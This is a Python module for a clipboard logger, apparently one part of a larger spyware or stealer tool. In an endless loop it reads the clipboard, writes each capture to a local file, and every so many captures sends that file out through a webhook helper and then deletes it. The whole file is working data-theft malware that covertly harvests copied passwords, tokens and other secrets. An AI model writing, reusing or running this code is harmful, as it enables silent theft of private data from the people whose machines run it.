import pyperclip
import time

from utils.logging_utils import log_info, log_error, log_to_file
from utils.webhook_utils import send_log_file
from utils.file_utils import clear_log_file
from config import CLIPBOARD_LOG_INTERVAL_SEC, CLIPBOARD_EVENTS_BEFORE_SEND


class ClipboardLogger:
    def __init__(self):
        self.log_file = "clipboard.txt"
        self.interval = CLIPBOARD_LOG_INTERVAL_SEC
        self.counter_max = CLIPBOARD_EVENTS_BEFORE_SEND
        self.counter = 0
        self.running = True

    def log_clipboard(self):
        data = pyperclip.paste().replace("\n", r"\n")
        log_to_file(self.log_file, data)
        self.increment_and_check_counter()
        
    def increment_and_check_counter(self):
        self.counter += 1
        if self.counter > self.counter_max:
            log_info("SENDING CLIPBOARD LOG FILE")
            send_log_file(self.log_file)
            clear_log_file(self.log_file)
            log_info("Sent and cleared clipboard log file.")
            self.counter = 0

    def run(self):
        try:
            while self.running:
                self.log_clipboard()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)